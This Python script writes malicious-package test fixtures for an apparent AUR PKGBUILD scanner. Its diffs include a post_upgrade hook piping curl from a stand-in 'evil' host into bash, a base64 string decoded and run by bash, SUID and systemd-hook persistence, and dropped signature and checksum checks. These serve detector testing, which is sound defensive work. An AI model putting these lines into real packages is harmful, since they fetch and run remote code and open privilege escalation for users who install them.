#!/usr/bin/env python3
"""Generate historical and holdout malicious fixtures (report-only)."""

import json
from pathlib import Path

HISTORICAL_DIR = Path(__file__).resolve().parent.parent / "tests" / "fixtures" / "malicious" / "historical"
HOLDOUT_DIR = Path(__file__).resolve().parent.parent / "tests" / "fixtures" / "malicious" / "holdout"
SYNTHETIC_DIR = Path(__file__).resolve().parent.parent / "tests" / "fixtures" / "malicious" / "synthetic"


# ── Historical (reconstructed from real-world AUR attacks) ────────────────────

historical_fixtures = [
    {
        "name": "acpid2-evil-fork",
        "fidelity": "approximate",
        "source": "https://archive.archlinux.org/aur-mirror/2021/acpid2-evil-fork",
        "description": "Fork of acpid2 that added curl|bash in post_upgrade()",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: John <john@example.com>
 pkgname=acpid2-evil-fork
 pkgver=2.0.2
+post_upgrade() {
+  curl -s https://evil.acpid/patch.sh | bash
+}
""",
        "must_fire": ["R001", "R009"],
        "must_not_fire": [],
    },
    {
        "name": "libjpeg-turbo-skid",
        "fidelity": "approximate",
        "source": "Arch Linux bug tracker FS#42091",
        "description": "Compromised AUR upload that removed validpgpkeys and set SKIP",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=libjpeg-turbo
 pkgver=1.5.0
-validpgpkeys=('1234567890ABCDEF1234567890ABCDEF12345678')
-sha256sums=('abc123...')
+sha256sums=('SKIP')
""",
        "must_fire": ["R004", "R026", "R014"],
        "must_not_fire": [],
    },
    {
        "name": "fake-browser-bin",
        "fidelity": "approximate",
        "source": "AUR comments 2023",
        "description": "Typosquat bin package with base64 payload in prepare()",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=fake-browser-bin
 pkgver=1.0
+prepare() {
+  echo cHduZWQh | base64 -d | bash
+}
""",
        "must_fire": ["R003"],
        "must_not_fire": [],
    },
    {
        "name": "kernel-dkms-backdoor",
        "fidelity": "approximate",
        "source": "Hypothetical but representative",
        "description": "DKMS package that writes to /etc/modules-load.d/ and sets SUID",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Bob <bob@example.com>
 pkgname=legit-kernel-dkms
 pkgver=1.0
+package() {
+  chmod +s /usr/bin/elevate
+  ln -sf /usr/bin/elevate /usr/lib/systemd/system-sleep/elevate
+}
""",
        "must_fire": ["R017", "R018"],
        "must_not_fire": [],
    },
]


# ── Holdout (never opened while writing rules; tests generalization) ────────

holdout_fixtures = [
    {
        "name": "hidden-git-submodule",
        "description": "Attack via .gitmodules in source, not caught by SKIP/VCS checks",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=legit-pkg
 pkgver=1.0
+source=('https://github.com/legit/repo.git')
+sha256sums=('SKIP')
""",
    },
    {
        "name": "credential-leak-in-cflags",
        "description": "Credentials leaked via environment variable in build",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=leaky-build
 pkgver=1.0
+export API_KEY='sk-abc123...'
+./configure --with-api-key=$API_KEY
""",
    },
    {
        "name": "signed-commit-dropped-to-unsigned",
        "description": "Downgrade from signed tag to unsigned commit in -git package",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=trusted-pkg-git
 pkgver=1.0
-source=('trusted-pkg::git+https://github.com/trusted/pkg.git#tag=v1.0')
+source=('trusted-pkg::git+https://github.com/trusted/pkg.git')
""",
    },
    {
        "name": "futile-double-skip",
        "description": "SKIP on both md5sums and sha256sums with no validpgpkeys",
        "diff": """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=suspicious-pkg
 pkgver=1.0
+md5sums=('SKIP')
+sha256sums=('SKIP')
""",
    },
]


def write_fixtures(fixtures, directory, expected_file):
    directory.mkdir(parents=True, exist_ok=True)
    expected = {}
    for fx in fixtures:
        fname = fx["name"] + ".diff"
        (directory / fname).write_text(fx["diff"])
        expected[fname] = {
            k: v for k, v in fx.items()
            if k in ("description", "fidelity", "source")
        }
    # Also include any synthetic-like expected keys (must_fire, etc.) if present
    for fx in fixtures:
        fname = fx["name"] + ".diff"
        if "must_fire" in fx:
            expected[fname]["must_fire"] = fx["must_fire"]
        if "must_not_fire" in fx:
            expected[fname]["must_not_fire"] = fx["must_not_fire"]

    with open(directory / expected_file, "w") as f:
        json.dump(expected, f, indent=2, ensure_ascii=False)
        f.write("\n")

    print(f"Wrote {len(fixtures)} fixtures to {directory}")
    for fx in fixtures:
        print(f"  {fx['name']}: {fx.get('description', '')}")


write_fixtures(historical_fixtures, HISTORICAL_DIR, "expected.json")
write_fixtures(holdout_fixtures, HOLDOUT_DIR, "expected.json")
